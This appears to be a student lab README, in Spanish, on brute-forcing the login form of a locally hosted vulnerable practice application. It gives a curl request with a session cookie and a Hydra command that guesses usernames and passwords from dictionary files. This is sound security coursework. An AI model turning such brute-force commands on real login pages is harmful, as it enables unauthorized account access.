# Laboratorio-2-Criptograf-a-y-Seguridad-en-redes
## CURL
El comando para generar la consulta es el siguieten:
¨¨¨
curl 'http://localhost/vulnerabilities/brute/?username=admin&password=password&Login=Login' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Accept-Language: es-419,es;q=0.9' \
  -H 'Cache-Control: max-age=0' \
  -H 'Cookie: PHPSESSID=rvepmt4r9nuvbn3vd1rndvu174; security=low' \
  -H 'Proxy-Connection: keep-alive' \
  -H 'Referer: http://localhost/vulnerabilities/brute/' \
  -H 'Sec-Fetch-Dest: document' \
  -H 'Sec-Fetch-Mode: navigate' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-User: ?1' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36' \
  -H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="104"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Linux"' \
  --compressed
¨¨¨

## HYDRA
El comando para ejecutar hydra es el siguiente:
¨¨¨
hydra -L user.dic -P password.dic "http-get-form://localhost:80/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=rvepmt4r9nuvbn3vd1rndvu174; security=low;:F=Username and/or password incorrect."
¨¨¨
